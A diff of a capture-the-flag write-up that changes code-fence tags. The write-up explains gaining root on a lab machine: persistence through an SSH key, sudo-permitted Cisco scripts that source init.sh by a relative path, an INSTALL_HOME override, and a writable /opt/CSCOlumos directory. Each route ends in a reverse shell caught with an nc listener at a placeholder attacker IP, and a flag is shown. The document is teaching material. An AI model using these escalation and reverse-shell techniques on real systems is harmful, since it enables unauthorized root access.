@@ -6,7 +6,7 @@
 The shell we got from exploiting the ActiveMQ service only gives us a *pseudo-shell* (which is a bit annoying to use), so we start by adding our ssh public-key to `/home/activemq/.ssh/authorized_keys` so that we can ssh into the machine.
 
 As the user `prime` we have some sudo-rights which we are going to exploit to root the machine.
-```console
+```
 [prime@ip-10-128-2-125 ~]$ sudo -l
 Matching Defaults entries for prime on ip-10-128-2-125:
     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
@@ -19,13 +19,13 @@ User prime may run the following commands on ip-10-128-2-125:
 ```
 
 We are allowed to set environment variables and run scripts located in `/opt/CSCOlumos/rcmds/`. Inside this directory there are 88 (!) scripts which we can run.
-```console
+```
 [prime@ip-10-128-2-125 ~]$ ls /opt/CSCOlumos/rcmds/ -l | wc -l
 88
 ```
 
 With this many scripts to analyze for vulnerabilities the easiest method is probably to look at the smaller ones. There are multiple scripts which can be abused to escalate our privileges to root, using the same method(s). I ended up using the `hmadmin.sh` script to solve the challenge.
-```console
+```
 [prime@ip-10-128-2-125 rcmds]$ cat hmadmin.sh
 #!/bin/bash
 . init.sh
@@ -34,7 +34,7 @@ $INSTALL_HOME/bin/hmadmin.sh
 ```
 
 It first executes `init.sh`, which is a script doing a lot of stuff (e.g. set the `$INSTALL_HOME` environment variable to `/opt/CSCOlumos`), but most importantly, its path is not absolute. This means that we can be in any directory executing `/opt/CSCOlumos/rcmds/hmadmin.sh`, and the it will search for `init.sh` in our current working directory. Because we can execute `/opt/CSCOlumos/rcmds/hmadmin.sh` as root, and that script executes `init.sh` in our CWD (in this case /dev/shm), we can create an `init.sh` which gives us a reverse shell.
-```console
+```bash
 [prime@ip-10-128-2-125 shm]$ pwd
 /dev/shm
 [prime@ip-10-128-2-125 shm]$ ls
@@ -46,7 +46,7 @@ init.sh
 ```
 
 Running the command `sudo /opt/CSCOlumos/rcmds/hmadmin.sh` and listening on port 9001 with `nc -lnvp 9001` then gives us shell as root!
-```console
+```
 $ nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [<attacker_ip>] from (UNKNOWN) [10.128.2.125] 34292
@@ -60,7 +60,7 @@ EPT{5b2f8f8681b6621b519ef09adf371174}
 
 
 **Note:** During the ctf my exploit looked a little different. I made my own `init.sh` which basically was empty, created my own `bin/hmadmin.sh` in CWD which executed the reverse shell, and set the `INSTALL_HOME` environment variable to CWD to execute my own `bin/hmadmin.sh` file. This lead to the *real* `hmadmin.sh` to search for and execute my `bin/hmadmin.sh`
-```console
+```
 [prime@ip-10-128-2-125 shm]$ pwd
 /dev/shm
 [prime@ip-10-128-2-125 shm]$ ls
@@ -88,7 +88,7 @@ As a reminder, we can run scripts located in `/opt/CSCOlumos/rcmds/` as root.
 </p>
 
 Whoops...
-```console
+```
 [prime@ip-10-128-3-174 CSCOlumos]$ pwd
 /opt/CSCOlumos
 [prime@ip-10-128-3-174 CSCOlumos]$ ls -al
@@ -98,7 +98,7 @@ drwxr-xr-x.  4 root  root       39 Oct 15 03:42 ..
 ```
 
 Apparently, we just own the directory `/opt/CSCOlumos/` as the user `prime`, so we can create a new `rcmds` directory with any scripts we want inside, and run them as root...
-```console
+```
 [prime@ip-10-128-3-174 CSCOlumos]$ pwd
 /opt/CSCOlumos
 [prime@ip-10-128-3-174 CSCOlumos]$ ls rcmds/
@@ -110,7 +110,7 @@ shell.sh
 ```
 
 Running this script gives us a root shell once again.
-```console
+```
 $ nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [<attacker_ip>] from (UNKNOWN) [10.128.3.174] 52254
